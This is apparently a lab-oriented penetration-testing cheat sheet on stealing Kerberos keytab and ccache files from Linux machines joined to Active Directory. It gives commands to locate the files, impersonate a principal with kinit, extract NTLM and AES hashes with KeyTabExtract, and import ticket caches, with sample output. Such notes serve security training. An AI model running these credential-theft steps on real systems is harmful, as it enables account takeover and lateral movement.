# Kerberos Keytab - Linux

We loot `.keytab` files on **linux target** machines. This file contains kerberos credentials.

First, we can find out if the target machine is connected to active directory and who can access this machine

```sh
realm list
```

```sh
ps -ef | grep -i "winbind\|sssd"
```

## Keytab

Default location: `/etc/krb5.keytab`. If not found, we can find it:

```sh
find / -name *keytab* -ls 2>/dev/null
```

After finding the file, you can transfer it back to your pentest machine, or just use it on the target machine

>**Note:** To use a keytab file, we must have read and write (rw) privileges on the file.

### Impersonate

Find information about a `keytab` file

```sh
klist -k -t ./calos.keytab
```

Sample result:

```
Keytab name: FILE:/opt/specialfiles/carlos.keytab
KVNO Timestamp           Principal
---- ------------------- ------------------------------------------------------
   1 10/06/2022 17:09:13 carlos@INLANEFREIGHT.HTB
```

Copy the principal. Then create a ticket using `kinit`

```sh
kinit carlos@INLANEFREIGHT.HTB -k -t ./carlos.keytab
```

The ticket will automatically be imported into `KRB5CCNAME` environment variable. If needed, save a copy of it.

### Extract hash

Use [KeytabExtract](https://github.com/sosdave/KeyTabExtract) python script.

```sh
python3 keytabextract.py ./carlos.keytab
```

Sample output:

```
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : INLANEFREIGHT.HTB
        SERVICE PRINCIPAL : carlos/
        NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
        AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
        AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Depends on your use case, you might want to `Pass the Hash` using `NTLM` hash or crack them and get password.
### Ccache

`.ccache` file is temporary, they can be expired. Usually can be found in `/tmp`

```sh
find / -name *.ccache -ls 2>/dev/null
env | grep -i krb5
```

We need read access in order to import the ticket

```sh
export KRB5CCNAME=/tmp/krb5cc_647401106_I8I133
```